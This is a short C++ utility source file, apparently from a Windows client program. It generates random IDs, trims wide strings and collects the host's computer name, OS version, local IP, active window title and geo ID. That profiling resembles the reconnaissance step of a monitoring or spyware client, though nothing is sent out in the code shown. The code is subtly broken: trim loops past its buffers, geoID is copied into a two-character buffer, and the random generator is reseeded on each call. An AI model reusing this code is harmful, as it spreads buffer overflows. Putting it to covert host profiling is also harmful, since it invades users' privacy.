//
// Created by LUNAFE on 2022-02-04.
//

#include "util.h"

void util::genID(char *buf, int len) {
    static const char alphanum[] =
            "0123456789"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz";
    srand((unsigned) time(NULL));
    for (int i = 0; i < len - 1; ++i) {
        buf[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
    }
    buf[len - 1] = 0;
}

void util::trim(wchar_t *src, int index, wchar_t *dst) {
    for (int i = 0; i < (wcslen(src) * 2) - (index * 2); i++) {
        dst[i] = src[i + (index)];
    }
}

void util::initRetrieveInfo(struct INFO *info) {
    //wprintf(L"[DEBUG]initRetrieveInfo\n");

    wchar_t computerName[32];
    eventhandler::getComputerName(computerName);
    wcscpy(info->computerName, computerName);

    //wprintf(L"%S\n", computerName);

    wchar_t osVersion[16];
    eventhandler::getOSVersion(osVersion);
    wcscpy(info->osVersion, osVersion);

    //wprintf(L"%S\n", osVersion);

    wchar_t localIP[16];
    eventhandler::getIP(localIP);
    wcscpy(info->ipAddress, localIP);

    //wprintf(L"%S\n", localIP);

    wchar_t activeWindow[256];
    eventhandler::getActiveWindow(activeWindow);
    wcscpy(info->windowTitle, activeWindow);

    //wprintf(L"%S\n", activeWindow);

    wchar_t geoID[2];
    eventhandler::getGeoID(geoID);
    wcscpy(info->geoID, geoID);

    //wprintf(L"%S\n", geoID);
}
